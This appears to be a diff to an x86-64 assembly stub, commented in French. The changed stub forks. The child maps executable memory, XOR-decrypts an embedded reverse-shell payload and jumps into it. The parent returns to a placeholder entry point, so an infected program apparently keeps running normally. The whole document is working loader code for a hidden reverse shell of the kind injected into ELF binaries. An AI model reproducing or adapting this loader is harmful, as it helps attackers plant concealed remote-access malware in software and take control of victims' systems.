@@ -2,34 +2,47 @@ BITS 64
 global _start
 
 _start:
-    ; mmap(NULL, 0x1000, RWX, MAP_ANON|MAP_PRIVATE, -1, 0)
-    xor     rdi, rdi        ; addr = NULL
-    mov     rsi, 0x1000     ; taille = 4096
-    mov     rdx, 7          ; PROT_READ|PROT_WRITE|PROT_EXEC
-    mov     r10, 0x22       ; MAP_ANON|MAP_PRIVATE
-    mov     r8, -1          ; fd = -1
-    xor     r9, r9          ; offset = 0
-    mov     rax, 9          ; syscall mmap = 9
+    ; fork()
+    xor     rax, rax
+    mov     al, 57
     syscall
-    mov     r15, rax        ; r15 = adresse RWX
+    test    rax, rax
+    jnz     retour_pere
 
-    ; copier le shellcode chiffré dans la zone RWX
+    ; FILS : mmap zone RWX
+    xor     rdi, rdi
+    mov     rsi, 0x1000
+    mov     rdx, 7
+    mov     r10, 0x22
+    mov     r8, -1
+    xor     r9, r9
+    mov     rax, 9
+    syscall
+    mov     r15, rax
+
+    ; copier payload chiffré dans zone RWX
     lea     rsi, [rel payload]
     mov     rdi, r15
     mov     rcx, payload_fin - payload
+    mov     r14, rcx
     rep     movsb
 
-    ; déchiffrer en mémoire
+    ; déchiffrer XOR 0x41
     mov     rsi, r15
-    mov     rcx, payload_fin - payload
+    mov     rcx, r14
 dechiffre:
     xor     byte [rsi], 0x41
     inc     rsi
     loop    dechiffre
 
-    ; sauter vers le shellcode déchiffré
+    ; sauter vers shellcode déchiffré
     jmp     r15
 
+    ; PÈRE : retour à e_entry original
+retour_pere:
+    mov     rax, 0x4141414141414141
+    jmp     rax
+
 payload:
-    incbin "payload/reverse_shell_xor.bin"
+    incbin "payload/reverse_shell_core_xor.bin"
 payload_fin:
